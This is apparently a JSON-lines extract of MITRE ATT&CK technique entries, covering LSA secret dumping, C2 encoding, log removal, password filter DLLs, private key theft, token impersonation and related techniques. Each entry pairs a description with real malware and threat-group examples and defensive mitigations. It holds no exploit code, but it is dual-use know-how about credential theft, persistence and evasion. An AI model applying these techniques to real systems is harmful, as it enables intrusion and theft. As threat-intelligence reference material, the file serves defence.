{"text": " Adversaries with SYSTEM access to a host may attempt to access Local Security Authority (LSA) secrets, which can contain a variety of different credential materials, such as credentials for service accounts.(Citation: Passcape LSA Secrets)(Citation: Microsoft AD Admin Tier Model)(Citation: Tilbury Windows Credentials) LSA secrets are stored in the registry at <code>HKEY_LOCAL_MACHINE\\SECURITY\\Policy\\Secrets</code>. LSA secrets can also be dumped from memory.(Citation: ired Dumping LSA Secrets) [Reg](https://attack.mitre.org/software/S0075) can be used to extract from the Registry. [Mimikatz](https://attack.mitre.org/software/S0002) can be used to extract secrets from memory.(Citation: ired Dumping LSA Secrets)", "idx": "https://attack.mitre.org/techniques/T1003/004", "title": "LSA Secrets", "entity": "LSA Secrets", "entity_type": "techniques", "entity_context": ["Ke3chang has dumped credentials, including by using gsecdump.", "Dragonfly 2.0 dropped and executed SecretsDump to dump password hashes.", "CosmicDuke collects LSA secrets.", "LaZagne can perform credential dumping from LSA secrets to obtain account and password information.", "CrackMapExec can dump hashed passwords from LSA secrets for the targeted system.", "Threat Group-3390 actors have used gsecdump to dump credentials. They have also dumped credentials from domain controllers.", "Leafminer used several tools for retrieving login and password information, including LaZagne.", "Mimikatz performs credential dumping to obtain account and password information useful in gaining access to additional systems and enterprise network resources. It contains functionality to acquire information about credentials in many ways, including from the LSA.", "OilRig has used credential dumping tools such as LaZagne to steal credentials to accounts logged into the compromised system and to Outlook Web Access.", "Limit credential overlap across accounts and systems by training users and administrators not to use the same password for multiple accounts.", "Follow best practices for design and administration of an enterprise network to limit privileged account use across administrative tiers.", "SecretsDump and Mimikatz modules within Impacket can perform credential dumping to obtain account and password information.", "menuPass has used a modified version of pentesting tools wmiexec.vbs and secretsdump.py to dump credentials.", "Pupy can use Lazagne for harvesting credentials.", "APT33 has used a variety of publicly available tools like LaZagne to gather credentials.", "MuddyWater has performed credential dumping with LaZagne.", "Ensure that local administrator accounts have complex, unique passwords across all systems on the network.", "gsecdump can dump LSA secrets."], "is_subtechnique": true}
{"text": " Adversaries may gather information about the victim's network topology that can be used during targeting. Information about network topologies may include a variety of details, including the physical and/or logical arrangement of both external-facing and internal network environments. This information may also include specifics regarding network devices (gateways, routers, etc.) and other infrastructure. Adversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about network topologies may also be exposed to adversaries via online or other accessible data sets (ex: [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: DNS Dumpster) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)).", "idx": "https://attack.mitre.org/techniques/T1590/004", "title": "Network Topology", "entity": "Network Topology", "entity_type": "techniques", "entity_context": ["This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should focus on minimizing the amount and sensitivity of data available to external parties."], "is_subtechnique": true}
{"text": " Adversaries may exploit a system or application vulnerability to bypass security features. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Vulnerabilities may exist in defensive security software that can be used to disable or circumvent them. Adversaries may have prior knowledge through reconnaissance that security software exists within an environment or they may perform checks during or shortly after the system is compromised for [Security Software Discovery](https://attack.mitre.org/techniques/T1518/001). The security software will likely be targeted directly for exploitation. There are examples of antivirus software being targeted by persistent threat groups to avoid detection.", "idx": "https://attack.mitre.org/techniques/T1211", "title": "Exploitation for Defense Evasion", "entity": "Exploitation for Defense Evasion", "entity_type": "techniques", "entity_context": ["APT28 has used CVE-2015-4902 to bypass security features.", "Make it difficult for adversaries to advance their operation through exploitation of undiscovered or unpatched vulnerabilities by using sandboxing. Other types of virtualization and application microsegmentation may also mitigate the impact of some types of exploitation. Risks of additional exploits and weaknesses in these systems may still exist. ", "Update software regularly by employing patch management for internal enterprise endpoints and servers.", "Security applications that look for behavior used during exploitation such as Windows Defender Exploit Guard (WDEG) and the Enhanced Mitigation Experience Toolkit (EMET) can be used to mitigate some exploitation behavior.  Control flow integrity checking is another way to potentially identify and stop a software exploit from occurring.  Many of these protections depend on the architecture and target application binary for compatibility and may not work for software targeted for defense evasion.", "Develop a robust cyber threat intelligence capability to determine what types and levels of threat may use software exploits and 0-days against a particular organization."], "is_subtechnique": false}
{"text": " Adversaries may encode data with a standard data encoding system to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a standard data encoding system that adheres to existing protocol specifications. Common data encoding schemes include ASCII, Unicode, hexadecimal, Base64, and MIME.(Citation: Wikipedia Binary-to-text Encoding) (Citation: Wikipedia Character Encoding) Some data encoding systems may also result in data compression, such as gzip.", "idx": "https://attack.mitre.org/techniques/T1132/001", "title": "Standard Encoding", "entity": "Standard Encoding", "entity_type": "techniques", "entity_context": ["Bisonal has encoded binary data with Base64.", "Zebrocy has used URL/Percent Encoding on data exfiltrated via HTTP POST requests.", "Astaroth encodes data using Base64 before sending it to the C2 server. ", "SeaDuke C2 traffic is base64-encoded.", "POWRUNER can use base64 encoded C2 communications.", "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.", "Some Backdoor.Oldrea samples use standard Base64 + bzip2, and some use standard Base64 + reverse XOR + RSA-2048 to decrypt data received from C2 servers.", "WellMess has used Base64 encoding to uniquely identify communication to and from the C2.", "Mis-Type uses Base64 encoding for C2 traffic.", "njRAT uses Base64 encoding for C2 traffic.", "POWERSTATS encoded C2 traffic with base64.", "CORESHELL C2 messages are Base64-encoded.", "SMOKEDHAM has encoded its C2 traffic with Base64.", "QUADAGENT encodes C2 communications with base64.", "BLINDINGCAN has encoded its C2 traffic with Base64.", "Responses from the Pisloader C2 server are base32-encoded.", "RogueRobin base64 encodes strings that are sent to the C2 over its DNS tunnel.", "HOPLIGHT has utilized Zlib compression to obfuscate the communications payload. \t\n", "Fysbis can use Base64 to encode its C2 traffic.", "Dipsind encodes C2 traffic with base64.", "BADNEWS encodes C2 traffic with base64.", "Machete has used base64 encoding.", "Patchwork used Base64 to encode C2 traffic.", "A Lazarus Group malware sample encodes data with base64.", "xCaon has used Base64 to encode its C2 traffic.", "Kazuar encodes communications to the C2 server in Base64.", "Tropic Trooper has used base64 encoding to hide command strings delivered from the C2.", "PowerShower has the ability to encode C2 communications with base64 encoding.", "SpeakUp encodes C&C communication using Base64. ", "Several BRONZE BUTLER tools encode data with base64 when posting it to a C2 server.", "Octopus encodes C2 communications in Base64.", "C2 traffic from ADVSTORESHELL is encrypted, then encoded with Base64 encoding.", "S-Type uses Base64 encoding for C2 traffic.", "Sandworm Team's BCS-server tool uses base64 encoding and HTML tags for the communication traffic between the C2 server.\t", "Some Felismus samples use a custom method for C2 traffic that utilizes Base64.", "BabyShark has encoded data using certutil before exfiltration.", "Valak has returned C2 data as encoded ASCII.", "SUNBURST used Base64 encoding in its C2 traffic.", "ChChes can encode C2 data with a custom technique that utilizes Base64.\t", "Cobalt Strike can use Base64, URL-safe Base64, or NetBIOS encoding in its C2 traffic.", "SideTwist has used Base64 for encoded C2 traffic.", "KONNI has used a custom base64 key to encode stolen data before exfiltration.", "A JHUHUGIT variant encodes C2 POST data base64.", "RDAT can communicate with the C2 via base32-encoded subdomains.\t", "Ixeshe uses custom Base64 encoding schemes to obfuscate command and control traffic in the message body of HTTP requests.", "Misdat network traffic is Base64-encoded plaintext.", "More_eggs has used basE91 encoding, along with encryption, for C2 communication.", "MuddyWater has used tools to encode C2 communications including Base64 encoding.", "AutoIt backdoor has sent a C2 response that was base64-encoded.", "BS2005 uses Base64 encoding for communication in the message body of an HTTP request.", "TrickBot can Base64-encode C2 commands.", "Sliver can use standard encoding techniques like gzip and hex to ASCII to encode the C2 communication payload.", "Denis encodes the data sent to the server in Base64.", "HAFNIUM has used ASCII encoding for C2 traffic.", "gh0st RAT has used Zlib to compress C2 communications data before encrypting it.", "An APT19 HTTP malware variant used Base64 to encode communications to the C2 server.", "TA551 has used encoded ASCII text for initial C2 communications.", "Spark has encoded communications with the C2 server with base64. ", "APT33 has used base64 to encode command and control traffic.", "Daserf uses custom base64 encoding to obfuscate HTTP traffic.", "Chaes has used Base64 to encode C2 communications. ", "MechaFlounder has the ability to use base16 encoded strings in C2.", "Okrum has used base64 to encode C2 communication.", "Revenge RAT uses Base64 to encode information sent to the C2 server.", "OopsIE encodes data in hexadecimal format over the C2 channel.", "Stuxnet transforms encrypted binary data into an ASCII string in order to use it as a URL parameter value.", "Carbanak encodes the message body of HTTP traffic with Base64.", "GrimAgent can base64 encode C2 replies.", "Prikormka encodes C2 traffic with Base64.", "Ramsay has used base64 to encode its C2 traffic.", "For C2 over HTTP, Helminth encodes data with base64 and sends it via the \"Cookie\" field of HTTP requests. For C2 over DNS, Helminth converts ASCII characters into their hexadecimal values and sends the data in cleartext.", "Cobian RAT obfuscates communications with the C2 server using Base64 encoding.", "QakBot can Base64 encode system information sent to C2.", "Ebury has encoded C2 traffic in hexadecimal format.\t", "Elise exfiltrates data using cookie values that are Base64-encoded.", "Kessel has exfiltrated data via hexadecimal-encoded subdomain fields of DNS queries.", "down_new has the ability to base64 encode C2 communications."], "is_subtechnique": true}
{"text": " Adversaries may gather the victim's IP addresses that can be used during targeting. Public IP addresses may be allocated to organizations by block, or a range of sequential addresses. Information about assigned IP addresses may include a variety of details, such as which IP addresses are in use. IP addresses may also enable an adversary to derive other details about a victim, such as organizational size, physical location(s), Internet service provider, and or where/how their publicly-facing infrastructure is hosted. Adversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about assigned IP addresses may also be exposed to adversaries via online or other accessible data sets (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)).(Citation: WHOIS)(Citation: DNS Dumpster)(Citation: Circl Passive DNS) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)).", "idx": "https://attack.mitre.org/techniques/T1590/005", "title": "IP Addresses", "entity": "IP Addresses", "entity_type": "techniques", "entity_context": ["Andariel has limited its watering hole attacks to specific IP address ranges.", "HAFNIUM has obtained IP addresses for publicly-accessible Exchange servers.", "This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should focus on minimizing the amount and sensitivity of data available to external parties."], "is_subtechnique": true}
{"text": " Adversaries may search local system sources, such as file systems or local databases, to find files of interest and sensitive data prior to Exfiltration. Adversaries may do this using a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), such as [cmd](https://attack.mitre.org/software/S0106), which has functionality to interact with the file system to gather information. Some adversaries may also use [Automated Collection](https://attack.mitre.org/techniques/T1119) on the local system.", "idx": "https://attack.mitre.org/techniques/T1005", "title": "Data from Local System", "entity": "Data from Local System", "entity_type": "techniques", "entity_context": ["MCMD has the ability to upload files from an infected device.", "Koadic can download files off the target system to send back to the server.", "Data loss prevention can restrict access to sensitive data and detect sensitive data that is unencrypted.", "China Chopper's server component can upload local files.", "Hydraq creates a backdoor through which remote attackers can read data from files.", "APT39 has used various tools to steal files from the compromised host.", "XCSSET collects contacts and application data from files in Desktop, Documents, Downloads, Dropbox, and WeChat folders.", "APT29 has extracted files from compromised networks. ", "Taidoor can upload data and files from a victim's machine.", "GALLIUM collected data from the victim's local system, including password hashes from the SAM hive in the Registry.", "CookieMiner has retrieved iPhone text messages from iTunes phone backup files.", "TrickBot collects local files and information from the victim’s local machine.", "SLOTHFULMEDIA has uploaded files and information from victim machines.", "USBferry can collect information from an air-gapped host machine.\t", "P.A.S. Webshell has the ability to copy files on a compromised host.", "Rover searches for files on local drives based on a predefined list of file extensions.", "CosmicDuke steals user files from local hard drives with file extensions that match a predefined list.", "PUNCHTRACK scrapes memory for properly formatted payment card data.", "Inception used a file hunting plugin to collect .txt, .pdf, .xls or .doc files from the infected host.", "Sandworm Team has exfiltrated internal documents, files, and other data from compromised hosts.", "ROKRAT can request to upload collected host data and additional files.", "Cryptoistic can retrieve files from the local file system.", "Windigo has used a script to gather credentials in files left on disk by OpenSSH backdoors.", "Ixeshe can collect data from a local system.", "BRONZE BUTLER has exfiltrated files stolen from local systems.", "Ramsay can collect Microsoft Word documents from the target's file system, as well as <code>.txt</code>, <code>.doc</code>, and <code>.xls</code> files from the Internet Explorer cache.\t", "Goopy has the ability to exfiltrate documents from infected systems.\t", "InvisiMole can collect data from the system, and can monitor changes in specified directories.", "Lazarus Group malware IndiaIndia saves information gathered about the victim to a file that is uploaded to one of its 10 C2 servers. Lazarus Group malware RomeoDelta copies specified directories from the victim's machine, then archives and encrypts the directories before uploading to its C2 server.", "SombRAT has collected data and files from a compromised host.", "EnvyScout can collect sensitive NTLM material from a compromised host.", "Forfiles can be used to act on (ex: copy, move, etc.) files/directories in a system during (ex: copy files into a staging area before).", "Octopus can exfiltrate files from the system using a documents collector tool.", "Linfo creates a backdoor through which remote attackers can obtain data from local systems.", "PowerSploit contains a collection of Exfiltration modules that can access data from local files, volumes, and processes.", "Pasam creates a backdoor through which remote attackers can retrieve files.", "Threat Group-3390 ran a command to compile an archive of file types of interest from the victim user's directories.", "Frankenstein has enumerated hosts via Empire, gathering various local system information.", "Dtrack can collect a variety of information from victim machines.", "Caterpillar WebShell has a module to collect information from the local database. ", "Drovorub can transfer files from the victim machine.", "APT41 has uploaded files and data from a compromised host.", "Cobalt Strike can collect data from a local system.", "APT38 has collected data from a compromised host.", "GrimAgent can collect data and files from a compromised host.", "MobileOrder exfiltrates data collected from the victim mobile device.", "Machete searches the File system for files of interest. ", "Calisto can collect data from user directories.", "Ke3chang gathered information and files from local directories for exfiltration.", "BADFLICK has uploaded files from victims' machines.", "SDBbot has the ability to access the file system on a compromised host.", "Gamaredon Group has collected files from infected systems and uploaded them to a C2 server.", "MarkiRAT can upload data from the victim's machine to the C2 server.", " BLINDINGCAN has uploaded files from victim machines.", "Proxysvc searches the local system and gathers data.", "Wevtutil can be used to export events from a specific log.", "KGH_SPY can send a file containing victim system information to C2.", "APT37 has collected data from victims' local systems.", "SideTwist has the ability to upload files from a compromised host.", "PoisonIvy creates a backdoor through which remote attackers can steal system information.", "FIN7 has collected files and other sensitive information from a compromised network.", "Fox Kitten has searched local system resources to access sensitive documents.", "yty collects files with the following extensions: .ppt, .pptx, .pdf, .doc, .docx, .xls, .xlsx, .docm, .rtf, .inp, .xlsm, .csv, .odt, .pps, .vcf and sends them back to the C2 server.", "AppleSeed can collect data on a compromised host.", "Crutch can exfiltrate files from compromised systems.", "POWERSTATS can upload files from compromised hosts.", "Turla RPC backdoors can upload files from victim machines.", "Operation Wocao has exfiltrated files and directories of interest from the targeted system.", "TajMahal has the ability to steal documents from the local system including the print spooler queue.", "Dragonfly 2.0 collected data from local victim systems.", "FatDuke can copy files and directories from a compromised host.", "BlackMould can copy files on a compromised host.", "ShimRat has the capability to upload collected files to a C2.\t", "njRAT can collect data from a local system.", "WellMail can exfiltrate files from the victim machine.", "QakBot can use a variety of commands, including esentutl.exe to steal sensitive data from Internet Explorer and Microsoft Edge, to acquire information that is subsequently exfiltrated.", "When it first starts, BADNEWS crawls the victim's local drives and collects documents with the following extensions: .doc, .docx, .pdf, .ppt, .pptx, and .txt.", "SpicyOmelette has collected data and other information from a compromised host.", "RawPOS dumps memory from specific processes on a victim system, parses the dumped files, and scrapes them for credit card data.", "BoxCaon can upload files from a compromised host.", "Patchwork collected and exfiltrated files from the infected system.", "esentutl can be used to collect data from local file systems.", "Bandook can collect local files from the system . ", "FLASHFLOOD searches for interesting files (either a default or customized set of file extensions) on the local system. FLASHFLOOD will scan the My Recent Documents, Desktop, Temporary Internet Files, and TEMP directories. FLASHFLOOD also collects information stored in the Windows Address Book.", "LightNeuron can collect files from a local system.", "Out1 can copy files and Registry data from compromised hosts.", "RainyDay can use a file exfiltration tool to collect recently changed files on a compromised host.", "Bankshot collects files from the local system.", "Honeybee collects data from the local victim system.", "Kazuar uploads files from a specified directory to the C2 server.", "Ursnif has collected files from victim machines, including certificates and cookies.", "PinchDuke collects user files from the compromised host based on predefined file extensions.", "APT3 will identify Microsoft Office documents on the victim's computer.", "APT1 has collected files from a local victim.", "Stealth Falcon malware gathers data from the local victim system.", "Pillowmint has collected credit card data using native API functions.", "Dark Caracal collected complete contents of the 'Pictures' folder from compromised Windows systems.", "APT28 has retrieved internal documents from machines inside victim environments, including by using Forfiles to stage documents before exfiltration.", "GravityRAT steals files with the following extensions: .docx, .doc, .pptx, .ppt, .xlsx, .xls, .rtf, and .pdf.", "OSX_OCEANLOTUS.D has the ability to upload files from a compromised host.", "WellMess can send files from the victim machine to C2.", "menuPass has collected various files from the compromised computers.\n", "xCaon has uploaded files from victims' machines.", "Bazar can retrieve information from the infected machine.", "Andariel has collected large numbers of files from compromised network systems for later extraction.", "SUNBURST collected information from a compromised host.", "Dust Storm has used Android backdoors capable of exfiltrating specific files directly from the infected devices.", "FrameworkPOS can collect elements related to credit card data from process memory.", "Kimsuky has collected Office, PDF, and HWP documents from its victims.", "BadPatch collects files from the local system that have the following extensions, then prepares them for exfiltration: .xls, .xlsx, .pdf, .mdb, .rar, .zip, .doc, .docx.", "Nebulae has the capability to upload collected files to C2.", "FIN6 has collected and exfiltrated payment card data from compromised systems."], "is_subtechnique": false}
{"text": " Adversaries may delete or alter generated artifacts on a host system, including logs or captured files such as quarantined malware. Locations and format of logs are platform or product-specific, however standard operating system logs are captured as Windows events or Linux/macOS files such as [Bash History](https://attack.mitre.org/techniques/T1552/003) and /var/log/*. These actions may interfere with event collection, reporting, or other notifications used to detect intrusion activity. This may compromise the integrity of security solutions by causing notable events to go unreported. This activity may also impede forensic analysis and incident response, due to lack of sufficient data to determine what occurred.", "idx": "https://attack.mitre.org/techniques/T1070", "title": "Indicator Removal on Host", "entity": "Indicator Removal on Host", "entity_type": "techniques", "entity_context": ["Bazar's loader can delete scheduled tasks created by a previous instance of the malware.\t", "MCMD has the ability to remove set Registry Keys.", "Obfuscate/encrypt event files locally and in transit to avoid giving feedback to an adversary.", "SDBbot has the ability to clean up and remove data structures from a compromised host.", "RTM has the ability to remove Registry entries that it created during execution.", "Misdat is capable of deleting Registry keys used for persistence.", "APT29 removed evidence of email export requests using <code>Remove-MailboxExportRequest</code>. They temporarily replaced legitimate utilities with their own, executed their payload, and then restored the original file.", "GrimAgent can delete previously created tasks on a compromised host.", "Sibot will delete an associated registry key if a certain server response is received.", "Rising Sun can clear process memory by overwriting it with junk bytes.\t", "Orz can overwrite Registry settings to reduce its visibility on the victim.", "Maze has used the “Wow64RevertWow64FsRedirection” function following attempts to delete the shadow volumes, in order to leave the system in the same state as it was prior to redirection.\t", "Protect generated event files that are stored locally with proper permissions and authentication and limit opportunities for adversaries to increase privileges by preventing Privilege Escalation opportunities.", "ShadowPad has deleted arbitrary Registry values.", "CSPY Downloader has the ability to remove values it writes to the Registry.", "EVILNUM has a function called \"DeleteLeftovers\" to remove certain artifacts of the attack.", "SUNBURST removed IFEO values to clean up traces of execution.", "Bankshot deletes all artifacts associated with the malware from the infected machine.", "PoetRAT has the ability to overwrite scripts and delete itself if a sandbox environment is detected.", "Goopy has the ability to delete emails used for C2 once the content has been copied.\t", "Pillowmint can uninstall the malicious service from an infected machine.", "njRAT is capable of deleting objects related to itself (registry keys, files, and firewall rules) on the victim.", "Stuxnet removes itself from the system through a DLL export by deleting specific files and stored procedures.", "Automatically forward events to a log server or data repository to prevent conditions in which the adversary can locate and manipulate data on the local system. When possible, minimize time delay on event reporting to avoid prolonged storage on the local system. ", "BlackEnergy has removed the watermark associated with enabling the <code>TESTSIGNING</code> boot configuration option by removing the relevant strings in the <code>user32.dll.mui</code> of the system.", "Metamorfo has a command to delete a Registry key it uses, <code>\\Software\\Microsoft\\Internet Explorer\\notes</code>. ", "After encrypting its own log files, the log encryption module in Prikormka deletes the original, unencrypted files from the host."], "is_subtechnique": false}
{"text": " Adversaries may abuse resource forks to hide malicious code or executables to evade detection and bypass security applications. A resource fork provides applications a structured way to store resources such as thumbnail images, menu definitions, icons, dialog boxes, and code.(Citation: macOS Hierarchical File System Overview) Usage of a resource fork is identifiable when displaying a file’s extended attributes, using <code>ls -l@</code> or <code>xattr -l</code> commands. Resource forks have been deprecated and replaced with the application bundle structure. Non-localized resources are placed at the top level directory of an application bundle, while localized resources are placed in the <code>/Resources</code> folder.(Citation: Resource and Data Forks)(Citation: ELC Extended Attributes) Adversaries can use resource forks to hide malicious data that may otherwise be stored directly in files. Adversaries can execute content with an attached resource fork, at a specified offset, that is moved to an executable location then invoked. Resource fork content may also be obfuscated/encrypted until execution.(Citation: sentinellabs resource named fork 2020)(Citation: tau bundlore erika noerenberg 2020)", "idx": "https://attack.mitre.org/techniques/T1564/009", "title": "Resource Forking", "entity": "Resource Forking", "entity_type": "techniques", "entity_context": ["Configure applications to use the application bundle structure which leverages the <code>/Resources</code> folder location. ", "Keydnap uses a resource fork to present a macOS JPEG or text file icon rather than the executable's icon assigned by the operating system."], "is_subtechnique": true}
{"text": " Adversaries may register malicious password filter dynamic link libraries (DLLs) into the authentication process to acquire user credentials as they are validated. Windows password filters are password policy enforcement mechanisms for both domain and local accounts. Filters are implemented as DLLs containing a method to validate potential passwords against password policies. Filter DLLs can be positioned on local computers for local accounts and/or domain controllers for domain accounts. Before registering new passwords in the Security Accounts Manager (SAM), the Local Security Authority (LSA) requests validation from each registered filter. Any potential changes cannot take effect until every registered filter acknowledges validation. Adversaries can register malicious password filters to harvest credentials from local computers and/or entire domains. To perform proper validation, filters must receive plain-text credentials from the LSA. A malicious password filter would receive these plain-text credentials every time a password request is made.(Citation: Carnal Ownage Password Filters Sept 2013)", "idx": "https://attack.mitre.org/techniques/T1556/002", "title": "Password Filter DLL", "entity": "Password Filter DLL", "entity_type": "techniques", "entity_context": ["Ensure only valid password filters are registered. Filter DLLs must be present in Windows installation directory (C:\\Windows\\System32\\ by default) of a domain controller and/or local computer with a corresponding entry in HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Notification Packages.", "Strider has registered its persistence module on domain controllers as a Windows LSA (Local System Authority) password filter to acquire credentials any time a domain, local user, or administrator logs in or changes a password.", "Remsec harvests plain-text credentials as a password filter registered on domain controllers."], "is_subtechnique": true}
{"text": " Adversaries may configure system settings to automatically execute a program during system boot or logon to maintain persistence or gain higher-level privileges on compromised systems. Operating systems may have mechanisms for automatically running a program on system boot or account logon.(Citation: Microsoft Run Key)(Citation: MSDN Authentication Packages)(Citation: Microsoft TimeProvider)(Citation: Cylance Reg Persistence Sept 2013)(Citation: Linux Kernel Programming) These mechanisms may include automatically executing programs that are placed in specially designated directories or are referenced by repositories that store configuration information, such as the Windows Registry. An adversary may achieve the same goal by modifying or extending features of the kernel. Since some boot or logon autostart programs run with higher privileges, an adversary may leverage these to elevate privileges.", "idx": "https://attack.mitre.org/techniques/T1547", "title": "Boot or Logon Autostart Execution", "entity": "Boot or Logon Autostart Execution", "entity_type": "techniques", "entity_context": ["BoxCaon established persistence by setting the <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\load</code> registry key to point to its executable.", "xCaon has added persistence via the Registry key <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\load</code> which causes the malware to run each time any user logs in.", "Dtrack’s RAT makes a persistent target file with auto execution on the host start."], "is_subtechnique": false}
{"text": " Adversaries may gather credentials from information stored in the Proc filesystem or <code>/proc</code>. The Proc filesystem on Linux contains a great deal of information regarding the state of the running operating system. Processes running with root privileges can use this facility to scrape live memory of other running programs. If any of these programs store passwords in clear text or password hashes in memory, these values can then be harvested for either usage or brute force attacks, respectively. This functionality has been implemented in the MimiPenguin(Citation: MimiPenguin GitHub May 2017), an open source tool inspired by Mimikatz. The tool dumps process memory, then harvests passwords and hashes by looking for text strings and regex patterns for how given applications such as Gnome Keyring, sshd, and Apache use memory to store such authentication artifacts.", "idx": "https://attack.mitre.org/techniques/T1003/007", "title": "Proc Filesystem", "entity": "Proc Filesystem", "entity_type": "techniques", "entity_context": ["Follow best practices in restricting access to privileged accounts to avoid hostile programs from accessing sensitive information.", "LaZagne can obtain credential information running Linux processes.", "MimiPenguin can dump process memory and extract clear-text credentials.", "Ensure that root accounts have complex, unique passwords across all systems on the network."], "is_subtechnique": true}
{"text": " Adversaries may search for private key certificate files on compromised systems for insecurely stored credentials. Private cryptographic keys and certificates are used for authentication, encryption/decryption, and digital signatures.(Citation: Wikipedia Public Key Crypto) Common key and certificate file extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, .pfx, .cer, .p7b, .asc. Adversaries may also look in common key directories, such as <code>~/.ssh</code> for SSH keys on * nix-based systems or <code>C:&#92;Users&#92;(username)&#92;.ssh&#92;</code> on Windows. These private keys can be used to authenticate to [Remote Services](https://attack.mitre.org/techniques/T1021) like SSH or for use in decrypting other collected files such as email. Adversary tools have been discovered that search compromised systems for file extensions relating to cryptographic keys and certificates.(Citation: Kaspersky Careto)(Citation: Palo Alto Prince of Persia) Some private keys require a password or passphrase for operation, so an adversary may also use [Input Capture](https://attack.mitre.org/techniques/T1056) for keylogging or attempt to [Brute Force](https://attack.mitre.org/techniques/T1110) the passphrase off-line.", "idx": "https://attack.mitre.org/techniques/T1552/004", "title": "Private Keys", "entity": "Private Keys", "entity_type": "techniques", "entity_context": ["Kinsing has searched for private keys.", "Ensure only authorized keys are allowed access to critical resources and audit access lists regularly.", "Empire can use modules like <code>Invoke-SessionGopher</code> to extract private key and session information.", "APT29 obtained PKI keys, certificate files and the private encryption key from an Active Directory Federation Services (AD FS) container to decrypt corresponding SAML signing certificates.", "Rocke has used SSH private keys on the infected machine to spread its coinminer throughout a network.", "Hildegard has searched for private keys in .ssh.", "TeamTNT has searched for unsecured SSH keys.", "Ebury has intercepted unencrypted private keys as well as private key pass-phrases.\t", "Ensure permissions are properly set on folders containing sensitive private keys to prevent unintended access.", "jRAT can steal keys for VPNs and cryptocurrency wallets.", "Mimikatz's <code>CRYPTO::Extract</code> module can extract keys by interacting with Windows cryptographic application programming interface (API) functions.", "Machete has scanned and looked for cryptographic keys and certificate file extensions. ", "Use strong passphrases for private keys to make cracking difficult.", "When possible, store keys on separate cryptographic hardware instead of on the local system. ", "Operation Wocao has used Mimikatz to dump certificates and private keys from the Windows certificate store."], "is_subtechnique": true}
{"text": " Adversaries may duplicate then impersonate another user's token to escalate privileges and bypass access controls. An adversary can create a new access token that duplicates an existing token using <code>DuplicateToken(Ex)</code>. The token can then be used with <code>ImpersonateLoggedOnUser</code> to allow the calling thread to impersonate a logged on user's security context, or with <code>SetThreadToken</code> to assign the impersonated token to a thread. An adversary may do this when they have a specific, existing process they want to assign the new token to. For example, this may be useful for when the target user has a non-network logon session on the system.", "idx": "https://attack.mitre.org/techniques/T1134/001", "title": "Token Impersonation/Theft", "entity": "Token Impersonation/Theft", "entity_type": "techniques", "entity_context": ["An adversary must already have administrator level access on the local system to make full use of this technique; be sure to restrict users and accounts to the least privileges they require.  ", "REvil can obtain the token from the user that launched the explorer.exe process to avoid affecting the desktop of the SYSTEM user.", "Siloscape impersonates the main thread of <code>CExecSvc.exe</code> by calling <code>NtImpersonateThread</code>.", "Okrum can impersonate a logged-on user's security context using a call to the ImpersonateLoggedOnUser API.", "APT28 has used CVE-2015-1701 to access the SYSTEM token and copy it into the current process as part of privilege escalation.", "Limit permissions so that users and user groups cannot create tokens. This setting should be defined for the local system account only. GPO: Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > User Rights Assignment: Create a token object.  Also define who can create a process level token to only the local and network service through GPO: Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > User Rights Assignment: Replace a process level token.\n\nAdministrators should log in as a standard user but run their tools with administrator privileges using the built-in access token manipulation command <code>runas</code>.", "FIN8 has used a malicious framework designed to impersonate the lsass.exe/vmtoolsd.exe token.", "BitPaymer can use the tokens of users to create processes on infected systems.", "Shamoon can impersonate tokens using <code>LogonUser</code>, <code>ImpersonateLoggedOnUser</code>, and <code>ImpersonateNamedPipeClient</code>.", "Stuxnet attempts to impersonate an anonymous token to enumerate bindings in the service control manager.", "Cobalt Strike can steal access tokens from exiting processes.", "Aria-body has the ability to duplicate a token from ntprint.exe.", "FinFisher uses token manipulation with NtFilterToken as part of UAC bypass.", "Pupy can obtain a list of SIDs and provide the option for selecting process tokens to impersonate."], "is_subtechnique": true}
